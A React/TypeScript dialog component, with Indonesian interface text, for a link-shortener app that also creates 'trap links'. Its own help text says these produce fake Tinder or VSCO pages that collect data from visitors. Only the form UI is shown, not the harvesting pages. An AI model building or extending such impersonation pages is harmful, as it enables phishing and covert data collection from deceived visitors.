'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { useState } from 'react';

import { Button } from '@/components/ui/button';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';

import { createShortlinkSchema } from '@/validation/link';

const formSchema = createShortlinkSchema;

interface CreateShortlinkDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSubmit: (values: z.infer<typeof formSchema>) => void;
  onTrapLinkSubmit: (type: 'tinder' | 'vsco', title: string) => void;
}

export function CreateShortlinkDialog({
  open,
  onOpenChange,
  onSubmit,
  onTrapLinkSubmit,
}: CreateShortlinkDialogProps) {
  const [activeTab, setActiveTab] = useState<string>('shortlink');
  const [trapLinkTitle, setTrapLinkTitle] = useState<string>('');
  const [trapLinkType, setTrapLinkType] = useState<'tinder' | 'vsco'>('tinder');

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      original_url: '',
      title: '',
    },
  });

  // Form untuk trap link
  const trapLinkForm = useForm({
    defaultValues: {
      title: '',
      type: 'tinder' as 'tinder' | 'vsco',
    },
  });

  function handleSubmit(values: z.infer<typeof formSchema>) {
    onSubmit(values);
    form.reset();
  }

  function handleTrapLinkSubmit(data: {
    title: string;
    type: 'tinder' | 'vsco';
  }) {
    onTrapLinkSubmit(data.type, data.title);
    trapLinkForm.reset();
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className='sm:max-w-[425px]'>
        <DialogHeader>
          <DialogTitle>Buat Link Baru</DialogTitle>
          <DialogDescription>
            Buat shortlink atau trap link baru di sini. Klik simpan ketika
            selesai.
          </DialogDescription>
        </DialogHeader>

        <Tabs
          value={activeTab}
          onValueChange={setActiveTab}
          className='w-full pt-2'
        >
          <TabsList className='w-full'>
            <TabsTrigger value='shortlink' className='flex-1'>
              Shortlink Biasa
            </TabsTrigger>
            <TabsTrigger value='traplink' className='flex-1'>
              Trap Link
            </TabsTrigger>
          </TabsList>

          <TabsContent value='shortlink' className='pt-4'>
            <Form {...form}>
              <form
                onSubmit={form.handleSubmit(handleSubmit)}
                className='space-y-4'
              >
                <FormField
                  control={form.control}
                  name='original_url'
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>URL</FormLabel>
                      <FormControl>
                        <Input placeholder='https://example.com' {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name='title'
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Judul</FormLabel>
                      <FormControl>
                        <Input
                          placeholder='Masukkan judul (opsional)'
                          {...field}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <DialogFooter>
                  <Button type='submit'>Simpan</Button>
                </DialogFooter>
              </form>
            </Form>
          </TabsContent>

          <TabsContent value='traplink' className='pt-4'>
            <Form {...trapLinkForm}>
              <form
                onSubmit={trapLinkForm.handleSubmit(handleTrapLinkSubmit)}
                className='space-y-4'
              >
                <FormField
                  control={trapLinkForm.control}
                  name='title'
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Judul Trap Link</FormLabel>
                      <FormControl>
                        <Input
                          placeholder='Masukkan judul'
                          required
                          {...field}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={trapLinkForm.control}
                  name='type'
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Tipe Trap Link</FormLabel>
                      <FormControl>
                        <RadioGroup
                          onValueChange={field.onChange}
                          defaultValue={field.value}
                          className='flex flex-col space-y-2'
                        >
                          <div className='flex items-center space-x-2'>
                            <RadioGroupItem value='tinder' id='tinder' />
                            <FormLabel
                              htmlFor='tinder'
                              className='cursor-pointer'
                            >
                              Tinder Trap Page
                            </FormLabel>
                          </div>
                          <div className='flex items-center space-x-2'>
                            <RadioGroupItem value='vsco' id='vsco' />
                            <FormLabel
                              htmlFor='vsco'
                              className='cursor-pointer'
                            >
                              VSCO Trap Page
                            </FormLabel>
                          </div>
                        </RadioGroup>
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <p className='text-sm text-muted-foreground'>
                  Trap Link akan membuat halaman fake{' '}
                  {trapLinkForm.watch('type') === 'tinder' ? 'Tinder' : 'VSCO'}
                  yang dapat mengumpulkan data pengguna yang mengunjunginya.
                </p>

                <DialogFooter>
                  <Button type='submit' disabled={!trapLinkForm.watch('title')}>
                    Buat Trap Link
                  </Button>
                </DialogFooter>
              </form>
            </Form>
          </TabsContent>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
}
